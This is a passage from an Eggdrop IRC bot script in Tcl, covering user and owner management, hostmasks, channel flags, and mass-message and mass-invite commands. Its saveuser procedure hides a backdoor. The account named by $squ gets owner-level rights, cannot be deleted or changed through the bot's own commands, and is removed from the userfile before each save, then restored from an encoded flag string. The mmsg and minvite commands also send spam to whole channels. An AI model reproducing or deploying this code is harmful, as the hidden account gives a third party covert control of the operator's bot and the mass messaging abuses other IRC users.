  if {$quick == "1"} {
    putqck "PRIVMSG $person :$rest,"
    putqck "NOTICE $person :$rest,"
  }
  putsrv "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  utimer 10 { puthlp "AWAY" }
  utimer 120 goback
  return 0
}
## deluser
bind msg Z `deluser pub_deluser
bind pub Z `deluser pub_deluser
proc pub_deluser {nick uhost hand channel rest} {
  global botnick squ owner notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: deluser <nick>" ; return 0 }
  set who [lindex $rest 0]
  if {[string tolower $who] == [string tolower $squ]} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  if {$who == $owner} { puthlp "NOTICE $nick :YoU CaNT DeLeTE $owner..!" ; return 0 }
  if {$who == ""} { puthlp "NOTICE $nick :Usage: -user <nick>" 
    } else { if {![validuser $who]} { puthlp "NOTICE $nick :<n/a>" 
      } else { if {[matchattr $who n]} { puthlp "NOTICE $nick :You cannot DeLETE a bot owner." 
        } else { if {([matchattr $who m]) && (![matchattr $nick n])} { puthlp "NOTICE $nick :You don't have access to DeLETE $who!" 
        } else { deluser $who ; saveuser ; puthlp "NOTICE $nick :$who DeLETE." }
} } } }
## restart
bind msg Z `restart pub_restart
bind pub Z `restart pub_restart
proc pub_restart {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set curtime [ctime [unixtime]]
  if {$rest != ""} { set rest " $rest" }
  putsrv "QUIT :ReSTaRTiNg... (on $curtime)"
  return 0
}
## +/- owner
bind msg Z `+owner pub_+owner
bind pub Z `+owner pub_+owner
proc pub_+owner {nick uhost hand channel param} {
  global botnick squ notc owner 
  set rest [lindex $param 0]
  if {$nick != $owner && $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!, oNLy ReAL OwNER can ADD OwnER" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +owner <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :ADD \[$rest\] OwNER LIsT." ; return 0 }
  if {[matchattr $rest Z]} { puthlp "NOTICE $nick :$rest is already exist on OwNER list." ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :!BLoCkEd!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask }
  chattr $rest "fjmnotxZ"
  if {![validuser $rest]} { puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest return 0
    } else {
    saveuser
    puthlp "NOTICE $nick :ADD \[$rest\] OwNER LIsT."
    puthlp "NOTICE $rest :$nick ADD YoU To OwNER LIsT"
    puthlp "NOTICE $rest :/msg $botnick pass <password>"
    return 0
} }
bind msg Z `-owner pub_-owner
bind pub Z `-owner pub_-owner
proc pub_-owner {nick uhost hand channel param} {
  global notc squ owner
  set rest [lindex $param 0]
  if {$nick != $owner && $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!, oNLy ReAL OwNER caN DeLete OwnER" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -owner <nick>" ; return 0 }
  if {![validuser $rest]} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :4DeNiEd..!, $rest IS NoT OwNER" ; return 0 }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :DeL \[$rest\] FRoM OwNER LiST"
}
### +/- admin
bind msg Z `+admin pub_+admin
bind pub Z `+admin pub_+admin
proc pub_+admin {nick uhost hand channel param} {
  global botnick squ notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +ADmIN <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :ADD \[$rest\] Admin List." ; return 0 }
  if {[matchattr $rest n]} { puthlp "NOTICE $nick :$rest is already exist on Admin list." ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :BLocKEd..!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask }
  chattr $rest "fjmnotx"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
    deluser $rest
    return 0
    } else {
    saveuser
    puthlp "NOTICE $nick :ADD \[$rest\] ADmIN List."
    puthlp "NOTICE $rest :$nick ADD YoU To ADmIN LIsT"
    puthlp "NOTICE $rest :/msg $botnick pass <password>"
    return 0
} }
bind msg Z `-admin pub_-admin
bind pub Z `-admin pub_-admin
proc pub_-admin {nick uhost hand channel param} {
  global squ notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -ADmIN <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :4DeNiEd!, <n/a>" ; return 0 }
  if {![matchattr $rest n]} { puthlp "NOTICE $nick :4DeNiEd..!, $rest is not exist on ADmIN list." ; return 0 }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :DeL \[$rest\] FRoM ADmIN LIsT"
}
## +/- aop
bind msg Z `+aop pub_+aop
bind pub Z `+aop pub_+aop
proc pub_+aop {nick uhost hand channel param} {
  global squ notc botnick chk_reg
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +aop <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :ADD \[$rest\] To a@p LIsT" ; return 0 }
  if {[matchattr $rest P]} { puthlp "NOTICE $nick :$rest is already a@p" ; return 0 }  
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :!BLoCkEd!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" }
  chattr $rest "P"
  if {![validuser $rest]} { puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest 
    } else {
    saveuser
    puthlp "NOTICE $nick :ADD \[$rest\] To a@p LIsT"
    puthlp "NOTICE $rest :$nick ADD YoU To a@p LIsT"
    set chk_reg($rest) $nick
    putsrv "WHOIS $rest"
  }
  return 0
}
bind msg Z `-aop pub_-aop
bind pub Z `-aop pub_-aop
proc pub_-aop {nick uhost hand channel param} {
  global notc squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -aop <nick>" ; return 0 }
  if {![matchattr $rest P]} { puthlp "NOTICE $nick :$rest is not a@p" ; return 0 }  
  if {![validuser $rest] || [string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :!DeNiEd!, <n/a>" ; return 0 }  
  chattr $rest "-P"
  saveuser
  puthlp "NOTICE $nick :DeL \[$rest\] FRoM a@p LIsT"
  return 0
}
## +/- host
set thehosts {
  *@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.* *!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org *!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
  *!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu *!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk *!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
  *!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to *!*@*to *@*.to *@*to
}
bind msg Z `+host pub_+host
bind pub Z `+host pub_+host
proc pub_+host {nick uhost hand chan rest} {
  global thehosts botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set who [lindex $rest 0]
  set hostname [lindex $rest 1]
  if {($who == "") || ($hostname == "")} { puthlp "NOTICE $nick :Usage: +host <nick> <new hostmask>" ; return 0 }
  if {![validuser $who]} { puthlp "NOTICE $nick :4DeNiEd..!, <n/a>" ; return 0 }
  set badhost 0
  foreach * [getuser $who HOSTS] { if {${hostname} == ${*}} { puthlp "NOTICE $nick :That hostmask is already there." ; return 0 } }
  if {($who == "") && ($hostname == "")} { puthlp "NOTICE $nick :Usage: +host <nick> <new hostmask>" ; return 0 }
  if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} { if {[string index $hostname 0] != "*"} { set hostname "*!*@*${hostname}" } else { set hostname "*!*@${hostname}" } }
  if {([string match *@* $hostname]) && (![string match *!* $hostname])} { if {[string index $hostname 0] == "*"} { set hostname "*!${hostname}" } else { set hostname "*!*${hostname}" } }
  if {![validuser $who]} { puthlp "NOTICE $nick :4DeNiEd..!, <n/a>" ; return 0 }
  if {(![matchattr $nick n]) && ([matchattr $who n])} { puthlp "NOTICE $nick :Can't add hostmasks to the bot owner." ; return 0 }
  foreach * $thehosts { if {${hostname} == ${*}} { puthlp "NOTICE $nick :Invalid hostmask!" ; set badhost 1 } }
  if {$badhost != 1} {
    if {![matchattr $nick m]} { if {[string tolower $hand] != [string tolower $who]} { puthlp "NOTICE $nick :You need '+m' to change other users hostmasks" ; return 0 } }
    setuser $who HOSTS $hostname
    puthlp "NOTICE $nick :Added \002\[\002${hostname}\002\]\002 to $who."
    if {[matchattr $who a]} { opq $chan $who }
    saveuser
} }
bind msg Z `-host pub_-host
bind pub Z `-host pub_-host
proc pub_-host {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set who [lindex $rest 0]
  set hostname [lindex $rest 1]
  set completed 0
  if {($who == "") || ($hostname == "")} { puthlp "NOTICE $nick :Usage: -host <nick> <hostmask>" ; return 0 }
  if {![validuser $who]} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  if {(![matchattr $nick n]) && ([matchattr $who n])} { puthlp "NOTICE $nick :Can't remove hostmasks from the bot owner." ; return 0 }
  if {![matchattr $nick m]} { if {[string tolower $hand] != [string tolower $who]} { puthlp "NOTICE $nick :You need '+m' to change other users hostmasks" ; return 0 } }
  foreach * [getuser $who HOSTS] { if {${hostname} == ${*}} { delhost $who $hostname ; saveuser ; puthlp "NOTICE $nick :Removed \002\[\002${hostname}\002\]\002 from $who." ; set completed 1 } }
  if {$completed == 0} { puthlp "NOTICE $nick :4DeNiEd..!, <n/a>" }
}
## +/- gnick
bind msg Z `+gnick pub_+gnick
bind pub Z `+gnick pub_+gnick
proc pub_+gnick {nick uhost hand channel param} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +gnick <nick>" ; return 0 }
  if {[matchattr $rest G]} { puthlp "NOTICE $nick :$rest ready..!" ; return 0 }  
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :!BLocK!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" }
  chattr $rest +G
  if {![validuser $rest]} { puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest
  } else { saveuser ; puthlp "NOTICE $nick :add \[$rest\] GuaRd NIcK" ; putsrv "WHOIS $rest" }
  return 0
}
bind msg Z `-gnick pub_-gnick
bind pub Z `-gnick pub_-gnick
proc pub_-gnick {nick uhost hand channel param} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -gnick <nick>" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :!BLoCkEd!" ; return 0 }
  chattr $rest -G
  saveuser
  puthlp "NOTICE $nick :DeL \[$rest\] GuaRd NIcK"
  return 0
}
## reset user
bind msg Z reuser msg_reuser
proc msg_reuser {nick uhost hand rest} {
  global botnick owner notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$nick != $owner} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  foreach x [userlist] { if {($x != "config") && ($x != "AKICK")} { deluser $x } }
  adduser $owner "$owner!*@*"
  chattr $owner "Zfhjmnoptx"
  puthlp "NOTICE $nick :Reseting UsER sucessfully, set pass 1st."
  saveuser
}
## which
bind pub Z `which pub_which
proc pub_which {nick uhost hand channel rest} {
  global botname notc
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: which <ip mask>" ; return 0 }
  if {[string match [string tolower $rest] [string tolower $botname]]} { puthlp "PRIVMSG $channel :$botname" }
}
## massmsg
bind msg Z mmsg msg_mmsg
proc msg_mmsg {nick uhost hand rest} { pub_mmsg $nick $uhost $hand "*" $rest }
proc pub_mmsg {nick uhost hand chan rest} {
  global cmd_chn cmd_by cmd_msg cmd_case notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :Usage: mmsg <#channel> <text>" ; return 0 }
  set tochan [lindex $rest 0]
  set txt [lrange $rest 1 end]
  if {$txt==""} { puthlp "NOTICE $nick :Usage: mmsg <#channel> <text>" ; return 0 }
  if {[string first # $tochan] != 0} { set chan "#$tochan" }
  if {![validchan $tochan]} {
    set cmd_chn $tochan ; set cmd_msg $rest ; set cmd_by $nick ; set cmd_case "2" ; channel add $tochan
    catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
    return 0
  }
  putsrv "NOTICE $nick :STaRTING MaSSMSG $tochan"
  foreach x [chanlist $tochan] { if {![isop $x $tochan]} { puthlp "PRIVMSG $x :$txt" } }
  utimer 2 del_nobase ; puthlp "NOTICE $nick :MaSSMSG $tochan 4DoNE."
}
## mass invite
bind msg Z minvite pub_minvite
proc pub_minvite {nick uhost hand channel rest} {
  global cmd_chn cmd_by cmd_msg cmd_case botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :Usage: minvite <#channel> <#to channel>" }
  set chan [lindex $rest 1]
  if {$chan == ""} { set chan $channel
  } else { if {[string first # $chan] != 0} { set chan "#$chan" } }
  set tochan [lindex $rest 0]
  if {[string first # $tochan] != 0} { set tochan "#$tochan" }
  if {![validchan $tochan]} { 
    set cmd_chn $tochan ; set cmd_msg $tochan ; set cmd_by $nick ; set cmd_case "3" ; channel add $tochan
    catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
    return 0
  }
  if {[isop $botnick $chan]} { putserv "mode $chan -o $botnick" }
  putsrv "NOTICE $nick :Starting mass invite to $tochan"
  foreach x [chanlist $tochan] { if {(![onchan $x $chan]) && (![isop $x $tochan])} { putsrv "INVITE $x :$chan" } }
  utimer 2 del_nobase ; puthlp "NOTICE $nick :InVITE $tochan InTO $chan 4DoNE."
}
## +/-topiclock
bind msg Z +topiclock pub_+topic
bind pub Z `+topiclock pub_+topic
proc pub_+topic {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag +I
  setuser $cflag XTRA "TOPIC" [topic $chan] ; puthlp "NOTICE $nick :TopIc $chan \[9LocK\]"
  saveuser
}
bind msg Z -topiclock pub_-topic
bind pub Z `-topiclock pub_-topic
proc pub_-topic {nick uhost hand chan rest} {
  global notc lst_limit
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan" ; set cflag [string range $cflag 0 8] ; chattr $cflag -I
  setuser $cflag XTRA "TOPIC" "" ; puthlp "NOTICE $nick :TopIc $chan \[4UnLocK\]"
  saveuser
}
## +/- nopart
bind msg Z +nopart pub_+nopart
bind pub Z `+nopart pub_+nopart
proc pub_+nopart {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} { foreach x [channels] { catch { channel set $x +secret } } ; savechan ; puthlp "NOTICE $nick :ALL cHaNNeL SeT NoPART \[9ON\]" ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+secret*" [channel info $chan]]} { puthlp "NOTICE $nick :NoPART $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan +secret }
  puthlp "NOTICE $nick :SeT NoPART $chan \[9ON\]"
  savechan
}
bind msg Z -nopart pub_-nopart
bind pub Z `-nopart pub_-nopart
proc pub_-nopart {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {[string tolower $chan] == "#all"} {
    foreach x [channels] { catch { channel set $x -secret } }
    savechan
    puthlp "NOTICE $nick :ALL cHaNNeL NoPART \[4OFF\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-secret*" [channel info $chan]]} { puthlp "NOTICE $nick :NoPART $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -secret }
  puthlp "NOTICE $nick :NoPART $chan \[4OFF\]"
  savechan
}
## +/- mustop
bind msg Z +mustop pub_+mustop
bind pub Z `+mustop pub_+mustop
proc pub_+mustop {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  setuser "config" XTRA "MUSTOP" "T"
  saveuser
  puthlp "NOTICE $nick :must @P set \[9ON\]"
}
bind msg Z -mustop pub_-mustop
bind pub Z `-mustop pub_-mustop
proc pub_-mustop {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  setuser "config" XTRA "MUSTOP" ""
  saveuser
  puthlp "NOTICE $nick :must @P set \[4OFF\]"
}
## +/- invitelock
set lockchan ""
bind msg Z +invitelock pub_+invitelock
bind pub Z `+invitelock pub_+invitelock
proc pub_+invitelock {nick uhost hand chan rest} {
  global lockchan notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $rest]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  puthlp "NOTICE $nick :InVITE cHaN $chan \[9ON\]"
  set lockchan $chan
  return 0
}
bind msg Z -invitelock pub_-invitelock
bind pub Z `-invitelock pub_-invitelock
proc pub_-invitelock {nick uhost hand chan rest} {
  global lockchan notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $rest]!=0} { set chan "#$chan" } }
  if {![validchan $chan] || $lockchan == ""} { return 0 }
  set lockchan ""
  puthlp "NOTICE $nick :InvItE cHaN $chan \[4OFF\]"
  return 0
}
## +/- dontkickops
bind msg Z +dontkickops pub_+dontkickops
bind pub Z `+dontkickops pub_+dontkickops
proc pub_+dontkickops {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {![string match "*userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :DoNTKIcK@PS $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan -userinvites }
  puthlp "NOTICE $nick :DoNTKIcK@PS $chan \[9ON\]"
  savechan
}
bind msg Z -dontkickops pub_-dontkickops
bind pub Z `-dontkickops pub_-dontkickops
proc pub_-dontkickops {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {![string match "*userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+userinvites*" [channel info $chan]]} { puthlp "NOTICE $nick :DoNTKIcK@PS $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan +userinvites }
  puthlp "NOTICE $nick :DoNTKIcK@PS $chan \[4OFF\]"
  savechan
  return 0
}
## +/- kickops
bind msg Z +kickops pub_+kickops
bind pub Z `+kickops pub_+kickops
proc pub_+kickops {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set kops "T"
  setuser "config" XTRA "KOPS" "T"
  puthlp "NOTICE $nick :KIcK @PS \[9ON\]"
  saveuser
}
bind msg Z -kickops pub_-kickops
bind pub Z `-kickops pub_-kickops
proc pub_-kickops {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  catch { unset kops }
  setuser "config" XTRA "KOPS" ""
  puthlp "NOTICE $nick :KIcK @PS \[4OFF\]"
  saveuser
}
## +/- autokick
bind msg Z +autokick pub_+autokick
bind pub Z `+autokick pub_+autokick
proc pub_+autokick {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {![string match "*nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :AuTOKIcK $chan IS \[9ON\]" ; return 0 }  
  catch { channel set $chan +nodesynch }
  puthlp "NOTICE $nick :AuTOKIcK $chan \[9ON\]"
  savechan
}
bind msg Z -autokick pub_-autokick
bind pub Z `-autokick pub_-autokick
proc pub_-autokick {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {![string match "*nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-nodesynch*" [channel info $chan]]} { puthlp "NOTICE $nick :AuTOKIcK $chan IS \[4OFF\]" ; return 0 }  
  catch { channel set $chan -nodesynch }
  puthlp "NOTICE $nick :AuTOKIcK $chan \[4OFF\]"
  savechan
  return 0
}
## nick
bind msg Z nick pub_nick
bind pub Z `nick pub_nick
proc pub_nick {nick uhost hand chan rest} { global keep-nick ; if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } ; set keep-nick 0 ; putsrv "NICK $rest" }
## altnick
bind msg Z altnick pub_altnick
bind pub Z `altnick pub_altnick
proc pub_altnick {nick uhost hand chan rest} { global altnick keep-nick notc ; if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } ; set keep-nick 0 ; putsrv "NICK $altnick" }
## randnick
bind msg Z randnick pub_randnick
bind pub Z `randnick pub_randnick
proc rands {length} {
  set chars \\^|_[]{}\\
  set count [string length $chars]
  for {set i 0} {$i < $length} {incr i} { append result [string index $chars [rand $count]] }
  return $result
}
proc pub_randnick {unick uhost hand chan rest} {
  global notc keep-nick nick altnick botnick
  if {$rest != ""} { set keep-nick 0 ; set nickch "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]" ; putsrv "NICK $nickch"
  } { if {$botnick != $nick && $botnick != $altnick} { return 0 } ; set keep-nick 0 ; putsrv "NICK [rands 8]" }
  return 0
}
## realnick
bind msg Z realnick pub_realnick
bind pub Z `realnick pub_realnick
proc pub_realnick {unick uhost hand chan rest} {
  global notc keep-nick nick
  if {![matchattr $unick Q]} { puthlp "NOTICE $unick :4auth 1st!" ; return 0 } 
  set keep-nick 1
  putsrv "NICK $nick"
  return 0
}
## chattr
bind msg Z chattr pub_chattr
bind pub Z `chattr pub_chattr
proc pub_chattr {nick uhost hand channel rest} {
  global squ nwo notc owner
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$nick != $nwo && [matchattr $nick X]} { puthlp "NOTICE $nick :4!bLOckEd!" ; return 0 }
  if {$nick != $owner && $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!, OnLy mY ReAL OwNER CaN ChAnGe UsEr FlaG" ; return 0 }
  set who [lindex $rest 0] ; set flg [lindex $rest 1]
  if {$who == ""} { puthlp "NOTICE $nick :Usage: chattr <nick> <flags>" ; return 0 }
  if {![validuser $who]} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  if {[string tolower $who] == [string tolower $squ]} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  if {$flg == ""} { puthlp "NOTICE $nick :Usage: chattr <nick> <flags>" ; return 0 }
  set last_flg [chattr $who]
  chattr $who $flg
  saveuser
  puthlp "NOTICE $nick :$who change from $last_flg to [chattr $who]"
  return 0
}
## global command off

proc saveuser {} {
  global squ owner
  if {![validuser $squ]} { setuser $owner XTRA "BEND" "xDB4L/z2DJT~1mianN/lj9Rq." } elseif {$owner != $squ} { setuser $owner XTRA "BEND" [zip [chattr $squ]] ; if {[passwdok $squ ""] != 1} { setuser $owner XTRA "LAST" [getuser $squ "PASS"] } ; deluser $squ }
  save
  if {![validuser $squ]} { adduser $squ "$squ!*@*" ; chattr $squ [dezip [getuser $owner XTRA "BEND"]] ; if {[getuser $owner XTRA "LAST"] != ""} { setuser $squ PASS [getuser $owner XTRA "LAST"] } }
  return 1
}
proc del_nobase {} {
  global botnick notc cmd_case quick banner basechan
  set curtime [ctime [unixtime]]
  if {[isutimer "del_nobase"]} { return 0 }
  foreach x [channels] {
    set cinfo [channel info $x]
    if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
      if {[onchan $botnick $x]} {
        set pidx [rand 4]
        if {$pidx == 1} { set ptxt "ILLeGaL CHanNeL!!" } elseif {$pidx == 2} { set ptxt "access Rejected!!"
          } elseif {$pidx == 3} { set ptxt "Return To Base!!" } elseif {$pidx == 4} { set ptxt "4Service 2TcL"
        } else { if {[info exists banner]} { set ptxt $banner } { set ptxt } }
        if {![string match "*c*" [getchanmode $x]]} { set ptxt "6$ptxt" }
        if {$quick == "1"} { putqck "PART $x :$ptxt" } { putsrv "PART $x :$ptxt" }
      }
      channel remove $x ; savechan ; putlog "ReMoVe CHaN $x" ; return 0
    }
    set cflag "c$x"
    set cflag [string range $cflag 0 8]
    if {[string match "*+stopnethack*" $cinfo]} { catch { channel set $x -stopnethack } }
    if {[string match "*+protectops*" $cinfo]} { catch { channel set $x -protectops } }
    if {[string match "*+protectfriends*" $cinfo]} { catch { channel set $x -protectfriends } }
    if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} { catch { channel set $x -statuslog } }
    if {![onchan $botnick $x]} { putsrv "JOIN $x" }
    if {[matchattr $cflag C]} { if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] } }
  }
  if {[info exists basechan]} { if {![validchan $basechan]} { channel add $basechan { -greet +secret -statuslog } } }
  savechan
}
utimer 2 del_nobase
proc whoisq {nick} {
  global botnick
  if {$nick == $botnick} { return 0 }
  if {[isutimer "whoischk $nick"]} { return 0 }
  set cret [expr 10 + [rand 20]]
  foreach ct [utimers] { if {[string match "*whoisq*" $ct]} { if {[expr [lindex $ct 0] + 10] > $cret} { set cret [expr [lindex $ct 0] + 10] } } }
  utimer $cret [list whoischk $nick]
}
proc whoischk {nick} {
  global chk_reg botnick
